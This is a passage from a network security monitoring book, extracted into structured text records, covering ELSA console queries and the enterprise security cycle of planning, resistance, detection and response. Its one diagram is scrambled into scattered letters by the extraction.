- en: '*Figure 8-20: ELSA query window*'
  prefs: []
  type: TYPE_NORMAL
- en: To try out a sample query, I set my *From* time to the beginning of the data
  prefs: []
  type: TYPE_NORMAL
- en: available using the pop-up calendar, and then enter **www.testmyids.com** in
    the
  prefs: []
  type: TYPE_NORMAL
- en: query box. I click **Submit Query** and see the results shown in Figure 8-21\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 8-21: ELSA search results for* www .testmyids .com'
  prefs: []
  type: TYPE_NORMAL
- en: Notice the program(2) element in the Field Summary section. This indi-
  prefs: []
  type: TYPE_NORMAL
- en: cates that ELSA identified two sources of data for these results.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the records, we see the entries of program=bro_http and
  prefs: []
  type: TYPE_NORMAL
- en: program=bro_dns. When there are many different sources of data, we can use
  prefs: []
  type: TYPE_NORMAL
- en: this program element to narrow the results. For example, Figure 8-22 shows
  prefs: []
  type: TYPE_NORMAL
- en: what happens when I enter **192.168.2.127** in the query box, and then click
  prefs: []
  type: TYPE_NORMAL
- en: the program element.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 8-22: ELSA results for 192.168.2.127 grouped by program*'
  prefs: []
  type: TYPE_NORMAL
- en: NSM Consoles **179**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 122](index-214_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 123](index-214_2.png)'
  prefs: []
  type: TYPE_IMG
- en: You can see that the results are grouped by program, with bro_conn
  prefs: []
  type: TYPE_NORMAL
- en: providing the most results (16,261) and bro_smtp the fewest (2). Clicking
  prefs: []
  type: TYPE_NORMAL
- en: any Count field starts a new query for just those results. For example, click
  prefs: []
  type: TYPE_NORMAL
- en: the **snort** link to see Snort alerts associated with 192.168.2.127, as shown
    in
  prefs: []
  type: TYPE_NORMAL
- en: Figure 8-23\. (ELSA pulls these Snort alerts from the MySQL database.)
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 8-23: Some of the Snort alerts in ELSA associated with 192.168.2.127*'
  prefs: []
  type: TYPE_NORMAL
- en: Clicking bro_conn displays Bro’s connection logs, a form of session data
  prefs: []
  type: TYPE_NORMAL
- en: similar to that of Argus and PRADS, but generated by Bro.
  prefs: []
  type: TYPE_NORMAL
- en: ELSA supports other integrated NSM data as well. For example, to
  prefs: []
  type: TYPE_NORMAL
- en: generate a transcript in Snorby (as we did with CapMe in Figure 8-17), click
  prefs: []
  type: TYPE_NORMAL
- en: the **Info** link next to any record, click the **Plugin** drop-down menu, and
  prefs: []
  type: TYPE_NORMAL
- en: choose **getPcap**, as shown in Figure 8-24\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 8-24: Choosing to retrieve full content*'
  prefs: []
  type: TYPE_NORMAL
- en: '*data with CapMe in ELSA*'
  prefs: []
  type: TYPE_NORMAL
- en: This option takes you to the CapMe authentication screen, and you
  prefs: []
  type: TYPE_NORMAL
- en: can enter a username and password to retrieve a transcript for the event in
  prefs: []
  type: TYPE_NORMAL
- en: question.
  prefs: []
  type: TYPE_NORMAL
- en: '**180** Chapter 8'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: ELSA’s ability to manipulate log data makes for some interesting queries.
  prefs: []
  type: TYPE_NORMAL
- en: For example, to query for all HTTP POST events that did not involve servers
  prefs: []
  type: TYPE_NORMAL
- en: 'in the United States, you could submit the following:'
  prefs: []
  type: TYPE_NORMAL
- en: +method:POST -country_code:US
  prefs: []
  type: TYPE_NORMAL
- en: Next, group the results by clicking the user_agent element of the Field
  prefs: []
  type: TYPE_NORMAL
- en: Summary. A sample of the results from my lab network is shown in Listing 8-3\.
  prefs: []
  type: TYPE_NORMAL
- en: 5724 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
  prefs: []
  type: TYPE_NORMAL
- en: 2314 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
  prefs: []
  type: TYPE_NORMAL
- en: 897 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like
  prefs: []
  type: TYPE_NORMAL
- en: Gecko) Chrome/24.0.1312.57 Safari/537.17
  prefs: []
  type: TYPE_NORMAL
- en: 788 -
  prefs: []
  type: TYPE_NORMAL
- en: '**599 realms/1.0.2 CFNetwork/548.1.4 Darwin/11.0.0** u'
  prefs: []
  type: TYPE_NORMAL
- en: 448 Dalvik/1.4.0 (Linux; U; Android 2.3.4; Kindle Fire Build/GINGERBREAD)
  prefs: []
  type: TYPE_NORMAL
- en: 231 com.apple.Maps/1.0 iPhone OS/6.0.1
  prefs: []
  type: TYPE_NORMAL
- en: '**227 village/1.16.1 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: 129 Shockwave Flash
  prefs: []
  type: TYPE_NORMAL
- en: '**85 Lost%20World/1.1.0 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: '**76 BejBlitz/600 CFNetwork/609 Darwin/13.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: '**68 JNPPirateSchool/1.0.6 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: 49 Google Update/1.3.21.135;winhttp;cup
  prefs: []
  type: TYPE_NORMAL
- en: '**48 PetCat/1.4 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: '**36 Mailroom/1.7.5.1 CFNetwork/609.1.4 Darwin/13.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: '**35 Paradise%20Cove/3.8 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: 27 Mozilla/5.0 ZMTransaction/1.0
  prefs: []
  type: TYPE_NORMAL
- en: 25 GoogleAnalytics/2.0b3 (iPad; U; CPU iPhone OS 5.1.1 like Mac OS X; en-us)
  prefs: []
  type: TYPE_NORMAL
- en: '**24 TinyPetsies/1.5.3 CFNetwork/548.1.4 Darwin/11.0.0**'
  prefs: []
  type: TYPE_NORMAL
- en: 17 Storm8/iPhone
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 8-3: ELSA query results for user_agent data*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can tell from the bolded code, my kids like to play their iPad
  prefs: []
  type: TYPE_NORMAL
- en: and PC games on a segment monitored by this lab sensor! Each game lists
  prefs: []
  type: TYPE_NORMAL
- en: its name as part of the user agent, e.g., **realms** at u, which helps the identification
    process. Beware malicious code masquerading via fake user agents,
  prefs: []
  type: TYPE_NORMAL
- en: however.
  prefs: []
  type: TYPE_NORMAL
- en: Since ELSA has been integrated into SO only recently, analysts are just
  prefs: []
  type: TYPE_NORMAL
- en: beginning to appreciate its power.
  prefs: []
  type: TYPE_NORMAL
- en: '**conclusion**'
  prefs: []
  type: TYPE_NORMAL
- en: 'This chapter surveyed the four main open source NSM consoles: Sguil,'
  prefs: []
  type: TYPE_NORMAL
- en: Squert, Snorby, and ELSA. These consoles generally do not generate new
  prefs: []
  type: TYPE_NORMAL
- en: NSM data on their own. Rather, they provide an interface to NSM data sup-
  prefs: []
  type: TYPE_NORMAL
- en: plied by other tools. The consoles help analysts review and query for relevant
  prefs: []
  type: TYPE_NORMAL
- en: information, and then pivot to related data in an efficient manner.
  prefs: []
  type: TYPE_NORMAL
- en: NSM Consoles **181**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Sguil is the original NSM console, and many consider it to be the reference
    NSM platform. Its six main features are the core capabilities analysts
  prefs: []
  type: TYPE_NORMAL
- en: need when doing NSM operations. Sguil lacks some of the flexibility found
  prefs: []
  type: TYPE_NORMAL
- en: in new applications, however. Tools like Squert, Snorby, and ELSA are web-
  prefs: []
  type: TYPE_NORMAL
- en: accessible. Snorby even offers an app for the iOS platform. ELSA incorpo-
  prefs: []
  type: TYPE_NORMAL
- en: rates a much richer set of NSM data, although analysts continue to extend
  prefs: []
  type: TYPE_NORMAL
- en: the capabilities of Sguil to accept data from non-network sources such as
  prefs: []
  type: TYPE_NORMAL
- en: OSSEC.
  prefs: []
  type: TYPE_NORMAL
- en: By getting a sense of the interface and capabilities of each tool, as well
  prefs: []
  type: TYPE_NORMAL
- en: as the primary forms of data they manipulate, you can begin to imagine the
  prefs: []
  type: TYPE_NORMAL
- en: sorts of detection and response operations one can conduct with this rich
  prefs: []
  type: TYPE_NORMAL
- en: data on hand. Choose the tool that best suits your operational needs. In the
  prefs: []
  type: TYPE_NORMAL
- en: next chapter I will outline ways to put NSM to work in your environment by
  prefs: []
  type: TYPE_NORMAL
- en: describing NSM operations.
  prefs: []
  type: TYPE_NORMAL
- en: '**182** Chapter 8'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Part IV**'
  prefs: []
  type: TYPE_NORMAL
- en: '**N S M i N a c T i o N**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**9**'
  prefs: []
  type: TYPE_NORMAL
- en: '**N S M o P e r aT i o N S**'
  prefs: []
  type: TYPE_NORMAL
- en: Analysts need tools to find intruders, but
  prefs: []
  type: TYPE_NORMAL
- en: methodology is more important than soft-
  prefs: []
  type: TYPE_NORMAL
- en: ware. Tools collect and interpret data, but
  prefs: []
  type: TYPE_NORMAL
- en: methodology provides the conceptual model.
  prefs: []
  type: TYPE_NORMAL
- en: Analysts must understand how to use tools to achieve
  prefs: []
  type: TYPE_NORMAL
- en: a particular goal, but it’s important to start with a good
  prefs: []
  type: TYPE_NORMAL
- en: operational model, and then select tools to provide
  prefs: []
  type: TYPE_NORMAL
- en: data supporting that model.
  prefs: []
  type: TYPE_NORMAL
- en: Too many security organizations put tools before operations. They think
  prefs: []
  type: TYPE_NORMAL
- en: “we need to buy a log management system” or “I will assign one analyst
  prefs: []
  type: TYPE_NORMAL
- en: to antivirus duty, one to data leakage protection duty,” and so on. A tool-
  prefs: []
  type: TYPE_NORMAL
- en: driven team will not be effective as a mission-driven team. When the mis-
  prefs: []
  type: TYPE_NORMAL
- en: sion is defined by running software, analysts become captive to the features
  prefs: []
  type: TYPE_NORMAL
- en: and limitations of their tools. Analysts who think in terms of what they need
  prefs: []
  type: TYPE_NORMAL
- en: in order to accomplish their mission will seek tools to meet those needs,
  prefs: []
  type: TYPE_NORMAL
- en: and keep looking if their requirements aren’t met. Sometimes they even
  prefs: []
  type: TYPE_NORMAL
- en: decide to build their own tools.
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: This chapter provides a foundation for developing an NSM operational model that
    will work for your organization. We’ll start with an overview of
  prefs: []
  type: TYPE_NORMAL
- en: the enterprise security cycle.
  prefs: []
  type: TYPE_NORMAL
- en: '**The enterprise Security cycle**'
  prefs: []
  type: TYPE_NORMAL
- en: This book advocates NSM as an effective operational model. I define NSM
  prefs: []
  type: TYPE_NORMAL
- en: as the collection, analysis, and escalation of indications and warnings to
  prefs: []
  type: TYPE_NORMAL
- en: detect and respond to intrusions. This approach doesn’t explicitly address
  prefs: []
  type: TYPE_NORMAL
- en: planning activities or trying to resist intrusions. All four phases of the secu-
  prefs: []
  type: TYPE_NORMAL
- en: rity cycle—planning, resistance, detection, and response—are necessary
  prefs: []
  type: TYPE_NORMAL
- en: when protecting an organization from threats. Therefore, the first step in
  prefs: []
  type: TYPE_NORMAL
- en: building an operational model is to describe the relationships among plan-
  prefs: []
  type: TYPE_NORMAL
- en: ning, resistance, detection, and response, as shown in Figure 9-1 (a repro-
  prefs: []
  type: TYPE_NORMAL
- en: duction of Figure 1-1).1
  prefs: []
  type: TYPE_NORMAL
- en: IT mainly responsible, security assists
  prefs: []
  type: TYPE_NORMAL
- en: Plan
  prefs: []
  type: TYPE_NORMAL
- en: Resist
  prefs: []
  type: TYPE_NORMAL
- en: Prepare
  prefs: []
  type: TYPE_NORMAL
- en: Filter
  prefs: []
  type: TYPE_NORMAL
- en: Assess
  prefs: []
  type: TYPE_NORMAL
- en: Protect
  prefs: []
  type: TYPE_NORMAL
- en: Resolve
  prefs: []
  type: TYPE_NORMAL
- en: Escalate
  prefs: []
  type: TYPE_NORMAL
- en: Collect
  prefs: []
  type: TYPE_NORMAL
- en: Analyze
  prefs: []
  type: TYPE_NORMAL
- en: Respond
  prefs: []
  type: TYPE_NORMAL
- en: Detect
  prefs: []
  type: TYPE_NORMAL
- en: Security mainly responsible, IT assists
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-1: Enterprise security cycle*'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 9-1 shows the relationships among the four core security activi-
  prefs: []
  type: TYPE_NORMAL
- en: ties. Although it depicts a smooth progression from one phase to the next,
  prefs: []
  type: TYPE_NORMAL
- en: in the real world, all four activities occur simultaneously because organiza-
  prefs: []
  type: TYPE_NORMAL
- en: tions often experience different intrusion states at once. IT and security
  prefs: []
  type: TYPE_NORMAL
- en: teams plan new defenses while existing countermeasures repel some intrud-
  prefs: []
  type: TYPE_NORMAL
- en: ers. While working to detect one set of intruders, CIRTs are responding to
  prefs: []
  type: TYPE_NORMAL
- en: other intruders already in the organization.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Elements of this cycle appeared in my 2010 presentation to SANS titled “CIRT-Level
    Response to Advanced Persistent Threat” *(http://computer-forensics.sans.org/summit-archives/*
  prefs: []
  type: TYPE_NORMAL
- en: '*2010/31-bejtlich-cirt-level-response.pdf)*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**186** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***The Planning Phase***'
  prefs: []
  type: TYPE_NORMAL
- en: The goal of the planning phase is to position the organization as effectively
  prefs: []
  type: TYPE_NORMAL
- en: as possible to resist intrusions, or to counter weaknesses being exploited
  prefs: []
  type: TYPE_NORMAL
- en: by ongoing intruder activity. In this phase, IT and security teams prepare
  prefs: []
  type: TYPE_NORMAL
- en: and assess the situation. They enable defense and evaluate its effectiveness.
  prefs: []
  type: TYPE_NORMAL
- en: Budgeting, auditing, compliance checks, training, secure software develop-
  prefs: []
  type: TYPE_NORMAL
- en: ment, and similar work occupy this phase. Adversary simulation, penetra-
  prefs: []
  type: TYPE_NORMAL
- en: tion testing, and red teaming are examples of assessment work.
  prefs: []
  type: TYPE_NORMAL
- en: '**N o T e** *The*'
  prefs: []
  type: TYPE_NORMAL
- en: Red Team Journal *defines* red teaming *as “the practice of viewing a problem*
    *from an adversary or competitor’s perspective”* (http://redteamjournal.com/
  prefs: []
  type: TYPE_NORMAL
- en: about/red-teaming-and-alternative-analysis/) *. In practice, this means engaging*
  prefs: []
  type: TYPE_NORMAL
- en: '*one or more security professionals to conduct offensive operations against
    an organization in order to assess security measures. Adversary simulation is
    a form of red* *teaming where the operators seek to emulate the tools, techniques,
    and procedures of* *a selected threat group.* Penetration testing *is sometimes
    used as a synonym for red* *teaming, although some consider penetration testing
    to be a technique used by the red* *team to achieve its overall goal.*'
  prefs: []
  type: TYPE_NORMAL
- en: '***The Resistance Phase***'
  prefs: []
  type: TYPE_NORMAL
- en: During the resistance phase, IT and security teams filter and protect.
  prefs: []
  type: TYPE_NORMAL
- en: Automated countermeasures such as firewalls, antivirus, data-leakage pro-
  prefs: []
  type: TYPE_NORMAL
- en: tection, whitelisting, and related technologies designed to stop intruders
  prefs: []
  type: TYPE_NORMAL
- en: before they can gain unauthorized access to a network are parts of this
  prefs: []
  type: TYPE_NORMAL
- en: phase.
  prefs: []
  type: TYPE_NORMAL
- en: Security awareness training and configuration and vulnerability
  prefs: []
  type: TYPE_NORMAL
- en: management are other countermeasures designed to harden the human
  prefs: []
  type: TYPE_NORMAL
- en: and technical environment that also occur during the resistance phase.
  prefs: []
  type: TYPE_NORMAL
- en: Unfortunately, determined intruders eventually find at least one way into
  prefs: []
  type: TYPE_NORMAL
- en: a network, which makes the next two phases of the enterprise security
  prefs: []
  type: TYPE_NORMAL
- en: cycle—detection and response—mandatory.
  prefs: []
  type: TYPE_NORMAL
- en: '***The Detection and Response Phases***'
  prefs: []
  type: TYPE_NORMAL
- en: 'The detection and response phases include three elements of NSM: collect,'
  prefs: []
  type: TYPE_NORMAL
- en: analyze, and escalate. A fourth element, resolve, is part of the response
  prefs: []
  type: TYPE_NORMAL
- en: phase, but Figure 9-1 shows this particular element closer to the planning
  prefs: []
  type: TYPE_NORMAL
- en: element of the enterprise security cycle.
  prefs: []
  type: TYPE_NORMAL
- en: The detection and response phases of the enterprise security cycle are
  prefs: []
  type: TYPE_NORMAL
- en: at the heart of NSM, and they are the reason analysts perform collection,
  prefs: []
  type: TYPE_NORMAL
- en: analysis, and escalation to detect and respond to intrusions. Accordingly,
  prefs: []
  type: TYPE_NORMAL
- en: they deserve their own diagram showing how the various elements work
  prefs: []
  type: TYPE_NORMAL
- en: together. Figure 9-2 depicts that relationship, and the following section
  prefs: []
  type: TYPE_NORMAL
- en: explains these elements in more detail.
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **187**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: DETECTION
  prefs: []
  type: TYPE_NORMAL
- en: RESPONSE
  prefs: []
  type: TYPE_NORMAL
- en: Collection
  prefs: []
  type: TYPE_NORMAL
- en: Analysis
  prefs: []
  type: TYPE_NORMAL
- en: Escalation
  prefs: []
  type: TYPE_NORMAL
- en: Resolution
  prefs: []
  type: TYPE_NORMAL
- en: Host data
  prefs: []
  type: TYPE_NORMAL
- en: Constituent
  prefs: []
  type: TYPE_NORMAL
- en: C
  prefs: []
  type: TYPE_NORMAL
- en: A
  prefs: []
  type: TYPE_NORMAL
- en: A
  prefs: []
  type: TYPE_NORMAL
- en: notification
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: IOC-centric
  prefs: []
  type: TYPE_NORMAL
- en: Constituent
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: Net data
  prefs: []
  type: TYPE_NORMAL
- en: response
  prefs: []
  type: TYPE_NORMAL
- en: A
  prefs: []
  type: TYPE_NORMAL
- en: analysis, or
  prefs: []
  type: TYPE_NORMAL
- en: A
  prefs: []
  type: TYPE_NORMAL
- en: S
  prefs: []
  type: TYPE_NORMAL
- en: L
  prefs: []
  type: TYPE_NORMAL
- en: L
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: Y
  prefs: []
  type: TYPE_NORMAL
- en: “matching”
  prefs: []
  type: TYPE_NORMAL
- en: Y
  prefs: []
  type: TYPE_NORMAL
- en: New IOC
  prefs: []
  type: TYPE_NORMAL
- en: I
  prefs: []
  type: TYPE_NORMAL
- en: Application
  prefs: []
  type: TYPE_NORMAL
- en: Additional
  prefs: []
  type: TYPE_NORMAL
- en: S
  prefs: []
  type: TYPE_NORMAL
- en: S
  prefs: []
  type: TYPE_NORMAL
- en: creation
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: logs
  prefs: []
  type: TYPE_NORMAL
- en: response
  prefs: []
  type: TYPE_NORMAL
- en: UE
  prefs: []
  type: TYPE_NORMAL
- en: C
  prefs: []
  type: TYPE_NORMAL
- en: C
  prefs: []
  type: TYPE_NORMAL
- en: New
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: Data from
  prefs: []
  type: TYPE_NORMAL
- en: Collection
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: N
  prefs: []
  type: TYPE_NORMAL
- en: collection
  prefs: []
  type: TYPE_NORMAL
- en: S
  prefs: []
  type: TYPE_NORMAL
- en: S
  prefs: []
  type: TYPE_NORMAL
- en: P
  prefs: []
  type: TYPE_NORMAL
- en: third party
  prefs: []
  type: TYPE_NORMAL
- en: improvement
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: IOC-free
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: requirement
  prefs: []
  type: TYPE_NORMAL
- en: O
  prefs: []
  type: TYPE_NORMAL
- en: L
  prefs: []
  type: TYPE_NORMAL
- en: L
  prefs: []
  type: TYPE_NORMAL
- en: analysis, or
  prefs: []
  type: TYPE_NORMAL
- en: R
  prefs: []
  type: TYPE_NORMAL
- en: E
  prefs: []
  type: TYPE_NORMAL
- en: E
  prefs: []
  type: TYPE_NORMAL
- en: T
  prefs: []
  type: TYPE_NORMAL
- en: Data from
  prefs: []
  type: TYPE_NORMAL
- en: Analysis
  prefs: []
  type: TYPE_NORMAL
- en: (S)
  prefs: []
  type: TYPE_NORMAL
- en: “hunting”
  prefs: []
  type: TYPE_NORMAL
- en: (S) New analysis
  prefs: []
  type: TYPE_NORMAL
- en: A
  prefs: []
  type: TYPE_NORMAL
- en: requirement
  prefs: []
  type: TYPE_NORMAL
- en: L
  prefs: []
  type: TYPE_NORMAL
- en: constituent
  prefs: []
  type: TYPE_NORMAL
- en: improvement
  prefs: []
  type: TYPE_NORMAL
- en: Event observed/
  prefs: []
  type: TYPE_NORMAL
- en: Identification
  prefs: []
  type: TYPE_NORMAL
- en: Validation
  prefs: []
  type: TYPE_NORMAL
- en: Documentation
  prefs: []
  type: TYPE_NORMAL
- en: Notification
  prefs: []
  type: TYPE_NORMAL
- en: Ack
  prefs: []
  type: TYPE_NORMAL
- en: Containment
  prefs: []
  type: TYPE_NORMAL
- en: Remediation
  prefs: []
  type: TYPE_NORMAL
- en: stored
  prefs: []
  type: TYPE_NORMAL
- en: Request more data
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-2: NSM process*'
  prefs: []
  type: TYPE_NORMAL
- en: '**collection, analysis, escalation, and resolution**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The detection and response phases include the following elements:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Collection** Gathering the data we need to decide whether activity is'
  prefs: []
  type: TYPE_NORMAL
- en: normal, suspicious, or malicious.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analysis** The process of validating what we suspect about the nature'
  prefs: []
  type: TYPE_NORMAL
- en: 'of an event. As Figure 9-2 shows, there are two types of analysis: that'
  prefs: []
  type: TYPE_NORMAL
- en: which is focused on indicators of compromise (IOCs), and that which
  prefs: []
  type: TYPE_NORMAL
- en: is not. (IOCs are discussed in “Analysis” o[n page 193\.](#p227) )
  prefs: []
  type: TYPE_NORMAL
- en: '**Escalation** The act of notifying a constituent about the status of a'
  prefs: []
  type: TYPE_NORMAL
- en: compromised asset. (I advocate using the term constituent because
  prefs: []
  type: TYPE_NORMAL
- en: it captures the theme that those the CIRT serves have a “vote” in the
  prefs: []
  type: TYPE_NORMAL
- en: CIRT’s operations, because constituents own the computers monitored
  prefs: []
  type: TYPE_NORMAL
- en: by the CIRT.)
  prefs: []
  type: TYPE_NORMAL
- en: '**Resolution** The action taken by a constituent or security team mem-'
  prefs: []
  type: TYPE_NORMAL
- en: ber to reduce the risk of loss.
  prefs: []
  type: TYPE_NORMAL
- en: As with the diagram of the enterprise security cycle in Figure 9-1, the
  prefs: []
  type: TYPE_NORMAL
- en: workflow in Figure 9-2 appears orderly and linear, but that’s typically not
    the
  prefs: []
  type: TYPE_NORMAL
- en: case in real life. In fact, all phases of the detection and response processes
  prefs: []
  type: TYPE_NORMAL
- en: may occur at the same time. Sometimes, multiple incidents are occurring;
  prefs: []
  type: TYPE_NORMAL
- en: other times, the same incident occupies all four stages at once. Figure 9-2
  prefs: []
  type: TYPE_NORMAL
- en: shows that detection is composed of collection and analysis, and response
  prefs: []
  type: TYPE_NORMAL
- en: includes escalation and resolution. Let’s take a closer look at each of these
  prefs: []
  type: TYPE_NORMAL
- en: elements.
  prefs: []
  type: TYPE_NORMAL
- en: '**188** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Collection***'
  prefs: []
  type: TYPE_NORMAL
- en: Collection includes various processes that gather information, both techni-
  prefs: []
  type: TYPE_NORMAL
- en: 'cal and nontechnical:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Technical processes** Involves gathering data from endpoints or hosts'
  prefs: []
  type: TYPE_NORMAL
- en: (such as computers, servers, tablets, mobile devices, and so on), the net-
  prefs: []
  type: TYPE_NORMAL
- en: work, and logs (created by applications, devices, and related sources).
  prefs: []
  type: TYPE_NORMAL
- en: '**Nontechnical collection processes** Includes recording input from'
  prefs: []
  type: TYPE_NORMAL
- en: third parties (outsiders like partners, law enforcement, intelligence
  prefs: []
  type: TYPE_NORMAL
- en: agencies, and so on) and constituents.
  prefs: []
  type: TYPE_NORMAL
- en: '**technical Sources**'
  prefs: []
  type: TYPE_NORMAL
- en: One way to gather data from hosts is to use a commercial enterprise-class
  prefs: []
  type: TYPE_NORMAL
- en: platform like Mandiant for Intelligent Response (MIR, *http://www.mandiant*
  prefs: []
  type: TYPE_NORMAL
- en: '*.com/products/mandiant-platform/intelligent-response/*), which asks questions
    of endpoints via software. MIR enables CIRTs to *sweep* the enterprise for signs'
  prefs: []
  type: TYPE_NORMAL
- en: of intruder activity, and then conduct targeted analysis of potential victim
  prefs: []
  type: TYPE_NORMAL
- en: computers. Other options include the commercial version of F-Response
  prefs: []
  type: TYPE_NORMAL
- en: ( *http://www.f-response.com/*), which allows basic remote access to hard drives
    and memory, as well as native Windows tools such as Windows Management
  prefs: []
  type: TYPE_NORMAL
- en: Instrumentation Command-line (WMIC) and SysInternals PsExec.2
  prefs: []
  type: TYPE_NORMAL
- en: Network-centric collection is the focus of this book. The network access
  prefs: []
  type: TYPE_NORMAL
- en: methods discussed in Chapter 2, along with the platforms described in
  prefs: []
  type: TYPE_NORMAL
- en: Part II, and the tools introduced in Part III, combine to offer network-
  prefs: []
  type: TYPE_NORMAL
- en: derived data to analysts. Additional layers of interpretation transform raw
  prefs: []
  type: TYPE_NORMAL
- en: network information into indicators that merit attention.
  prefs: []
  type: TYPE_NORMAL
- en: Application logs are a primary source of technical data in the collection
  prefs: []
  type: TYPE_NORMAL
- en: phase, and any application or device that generates them can provide valu-
  prefs: []
  type: TYPE_NORMAL
- en: able information. Output from an antivirus agent and the Apache process
  prefs: []
  type: TYPE_NORMAL
- en: on a web server are examples of application logs.
  prefs: []
  type: TYPE_NORMAL
- en: 'Log collection requires at least the following:'
  prefs: []
  type: TYPE_NORMAL
- en: • A *log source* that creates application data
  prefs: []
  type: TYPE_NORMAL
- en: • A *log collector* that accepts and stores the data
  prefs: []
  type: TYPE_NORMAL
- en: • A *transport method* to move the logs from the source to the collector
  prefs: []
  type: TYPE_NORMAL
- en: For example, ELSA might collect logs from a proxy server, with Syslog
  prefs: []
  type: TYPE_NORMAL
- en: acting as the transport method.
  prefs: []
  type: TYPE_NORMAL
- en: Host data differs from application logs in that host data is often acquired
  prefs: []
  type: TYPE_NORMAL
- en: on demand, while logs are created by a regularly scheduled process. Using
  prefs: []
  type: TYPE_NORMAL
- en: MIR, for example, you can remotely query for host data like a mutex in
  prefs: []
  type: TYPE_NORMAL
- en: memory or an artifact in the Windows Registry. This concept of interrogat-
  prefs: []
  type: TYPE_NORMAL
- en: ing computers for specific indicators of compromise (IOCs, discussed in
  prefs: []
  type: TYPE_NORMAL
- en: “Analysis” o[n page 193](#p227)) is a powerful host-centric technique.
  prefs: []
  type: TYPE_NORMAL
- en: '2\. Mike Pilkington’s posts to the SANS forensics blog are especially helpful:
    *http://*'
  prefs: []
  type: TYPE_NORMAL
- en: '*computer-forensics.sans.org/blog/author/mpilkington*.'
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **189**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Nontechnical Sources**'
  prefs: []
  type: TYPE_NORMAL
- en: Nontechnical sources can be even more important to the success of the
  prefs: []
  type: TYPE_NORMAL
- en: NSM process. For example, the 2013 edition of the Mandiant M-Trends
  prefs: []
  type: TYPE_NORMAL
- en: report ( *http://www.mandiant.com/resources/m-trends/*) noted that organiza-
  prefs: []
  type: TYPE_NORMAL
- en: tions received warning of intrusions from external parties two-thirds of the
  prefs: []
  type: TYPE_NORMAL
- en: time; only one-third of the time did they discover the event themselves.
  prefs: []
  type: TYPE_NORMAL
- en: When identifying an event using internal sources, reports from users
  prefs: []
  type: TYPE_NORMAL
